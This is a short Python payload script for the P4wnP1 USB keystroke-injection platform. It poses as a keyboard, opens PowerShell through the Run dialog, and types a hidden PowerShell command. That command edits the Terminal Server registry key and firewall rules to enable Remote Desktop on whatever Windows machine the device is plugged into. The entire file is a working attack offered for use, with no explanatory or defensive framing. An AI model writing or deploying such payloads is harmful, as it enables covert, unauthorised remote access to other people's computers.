#!/usr/bin/env python3
import os, sys, time
P4WN_HOME=os.getenv("P4WN_HOME","/opt/p4wnp1"); sys.path.insert(0, os.path.join(P4WN_HOME,"tools"))
from hid_type import win_r, type_string

def main():
    win_r(); time.sleep(0.4); type_string("powershell\n"); time.sleep(0.8)
    ps = (
      "Set-ItemProperty -Path 'HKLM:\\System\\CurrentControlSet\\Control\\Terminal Server' -Name 'fDenyTSConnections' -Value 0;"
      "Enable-NetFirewallRule -DisplayGroup 'Remote Desktop';"
      "Write-Host 'RDP enabled';"
    )
    type_string(f"powershell -nop -w hidden -c \"{ps.replace('\"','\"\"')}\"\n")
    print("[*] RDP enable issued.")
    return 0

if __name__=='__main__': sys.exit(main())
